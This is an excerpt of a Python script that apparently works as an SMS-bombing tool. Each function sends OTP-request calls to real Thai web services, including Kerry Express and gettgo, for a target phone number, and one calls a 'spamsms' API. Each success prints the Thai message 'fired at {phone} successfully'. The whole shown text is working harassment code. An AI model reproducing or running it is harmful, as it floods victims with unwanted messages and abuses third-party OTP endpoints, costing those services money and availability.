...
def api74(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    r = requests.post("https://app.droprich.co/agent/registergetsmsotp",data=f"phonenumber={phone}",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
    if r.status_code == 200 or r.status_code == 201:
	     printx(f"ยิงไปที่ {phone} สำเร็จ")
...
def api75(phone):
     print (requests.get(f"https://apisms.cyber-safe.cloud/api/spamsms/5f2e85b1db/{phone}/10").json())
...
def api77(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    r = requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})
    if r.status_code == 200 or r.status_code == 201:
         printx(f"ยิงไปที่ {phone} สำเร็จ")
...
def api78(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    r = requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}")
    if r.status_code == 200 or r.status_code == 201:
	    printx(f"ยิงไปที่ {phone} สำเร็จ")
...
def api79(phone):
    da = datetime.datetime.now()
    ok = da.strftime("%H:%M:%S")
    r = requests.post("https://gettgo.com/sessions/otp_for_sign_in",headers=ha, data={"mobile_number":phone})
    if r.status_code == 200 or r.status_code == 201:
	    printx(f"ยิงไปที่ {phone} สำเร็จ")
